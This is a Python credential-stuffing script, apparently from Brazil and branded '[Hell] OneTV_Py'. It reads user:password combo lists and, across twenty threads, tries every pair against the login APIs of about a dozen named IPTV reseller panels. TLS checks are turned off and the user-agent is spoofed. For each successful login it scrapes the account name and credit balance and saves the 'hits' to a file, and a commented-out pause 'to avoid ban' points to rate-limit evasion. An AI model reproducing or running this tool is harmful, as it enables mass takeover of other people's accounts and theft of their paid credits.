#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import time
import requests
from bs4 import BeautifulSoup
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from concurrent.futures import ThreadPoolExecutor, as_completed

# Configurações de SSL
requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS = (
    'TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384:'
    'TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256:'
    'TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256:'
    'TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384:'
    'TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA:TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA:'
    'TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA:TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA:'
    'TLS_RSA_WITH_AES_128_GCM_SHA256:TLS_RSA_WITH_AES_256_GCM_SHA384:'
    'TLS_RSA_WITH_AES_128_CBC_SHA:TLS_RSA_WITH_AES_256_CBC_SHA:'
    'TLS_RSA_WITH_3DES_EDE_CBC_SHA:TLS13-CHACHA20-POLY1305-SHA256:'
    'TLS13-AES-128-GCM-SHA256:TLS13-AES-256-GCM-SHA384:ECDHE:!COMP'
)
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# Cores ANSI para o console
VERDE = '\033[92m'
VERMELHO = '\033[91m'
AZUL = '\033[94m'
RESET = '\033[0m'
GREEN = '\033[92m'

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def update_terminal_title(new_title):
    sys.stdout.write(f"\033]2;{new_title}\007")
    sys.stdout.flush()

NAME = "[Hell] OneTV_Py"
update_terminal_title(NAME)

def get_terminal_size():
    try:
        return os.get_terminal_size()
    except AttributeError:
        return os.terminal_size((80, 24))

def create_ascii_art():
    ascii_art = """
  +-+-+-+-+ |M|o|d|.| |A|r|u|j|a| +-+-+-+-+


  +-+-+-+-+-+ |SR|.| |H|E|L|L| +-+-+-+-+ 
  
      """
    return ascii_art


def center_text(text, width):
    return "\n".join(line.center(width) for line in text.splitlines())

def login_and_get_dashboard(username, password, base_url):
    login_url = f'{base_url}/sys/api.php'
    login_headers = {
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36'
    }
    login_data = {
        'action': 'login',
        'username': username,
        'password': password
    }

    try:
        with requests.Session() as session:
            login_response = session.post(login_url, headers=login_headers, data=login_data, verify=False)
            login_json = login_response.json()

            if not login_json.get('success'):
                return None, None, base_url

            dashboard_url = f'{base_url}/dashboard'
            dashboard_headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'referer': f'{base_url}/',
                'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
                'upgrade-insecure-requests': '1'
            }

            dashboard_response = session.get(dashboard_url, headers=dashboard_headers, verify=False)
            soup = BeautifulSoup(dashboard_response.text, 'html.parser')

            name = soup.find('span', {'class': 'username'}).text
            credits = soup.find('span', {'class': 'credits'}).text

            return name, credits, base_url
    except requests.exceptions.RequestException as e:
        print(f"Erro ao conectar ao site: {e}")
        return None, None, base_url

def process_account(username, password, i, total, base_url):
    name, credits, base_url = login_and_get_dashboard(username, password, base_url)

    if name is not None:
        print(VERDE + f"\n==[ Login válido ]==\n • User: {username}\n • Pass: {password}" + RESET)
        print(f" ===<use infos/>===\n • Nome: {name}")
        print(f" • Créditos: {credits}")
        with open("/content/drive/MyDrive/_Paineis/hits/Multi_tv_hits.txt", "a") as hit_file:
            hit_file.write(f"\n===<Sr.Hell e Mr.Arujá/>===\n• User: {username}\n• Pass: {password}\n• URL: {base_url}\n===<info user/>===\n• Nome: {name}\n• Créditos: {credits}\n")
        return True
    else:
        print(VERMELHO + f"\nLogin inválido: {username}:{password}" + RESET)
        return False

def listar_arquivos_combo():
    diretorio = "/content/drive/MyDrive/_Paineis/combo"
    arquivos = [f for f in os.listdir(diretorio) if f.endswith('.txt')]
    print("Arquivos disponíveis:")
    for i, arquivo in enumerate(arquivos, 1):
        print(f"{i}. {arquivo}")
    
    # Escolha automática do primeiro arquivo
    if arquivos:
        srhell = 0  # Índice do primeiro arquivo
        return os.path.join(diretorio, arquivos[srhell])
    else:
        print("Nenhum arquivo .txt encontrado na pasta.")
        return None

def main():
    clear_screen()
    terminal_size = get_terminal_size()
    ascii_art = create_ascii_art()
    centered_art = center_text(ascii_art, terminal_size.columns)
    signature = center_text("Don't pay for something 'free'.\n\n", terminal_size.columns)
    
    banner = f"{GREEN}{centered_art}\n\n{signature}{RESET}"
    print(banner)
    
    arquivo_combo = listar_arquivos_combo()
    
    with open(arquivo_combo, 'r') as file:
        linhas = file.readlines()

    total = len(linhas)
    validos = 0

    print(f"\nVerificando {total} contas...\n")

    # Lista de URLs a serem verificadas
    urls = [
#   PAINEIS BRTV     
        "https://p2ponline.brtv.me",
        "https://csnow.brtv.me",
        "https://csnow.brtv.me",
            #        "https://wolf.brtv.me",
    
#   PAINEIS CMSI.TOP    
        "https://onetv.cmzi.top",
        
 #   PAINEIS HIGHTV    
        "https://greentv.cmsz.site",
        "https://hightv.cmsz.site",  
        
        
#   PAINEIS CMSZ.SITE    
        "https://inovaplay.cmsz.site",
        "https://adlt.cmsz.site",
        "https://tecdesv.cmsz.site",
        "https://panel.cmsz.site",
        "https://panel.cmsz.site",
        "https://panel.cmsz.site",
            #        "https://versatplay.cmsz.site"
    ]

    with ThreadPoolExecutor(max_workers=20) as executor:
        futures = []
        for i, linha in enumerate(linhas, 1):
            try:
                user, password = linha.strip().split(':')
                for url in urls:
                    futures.append(executor.submit(process_account, user, password, i, total, url))
            except ValueError:
                continue

        for future in as_completed(futures):
            if future.result():
                validos += 1

#            if len(futures) % 400 == 0:
 #               print(AZUL + "\nPausando por 0.5 segundos para evitar banimento..." + RESET)
  #              time.sleep(0.0)

    print(f"\nTotal de válidos: {validos}/{total}\n")

if __name__ == "__main__":
    main()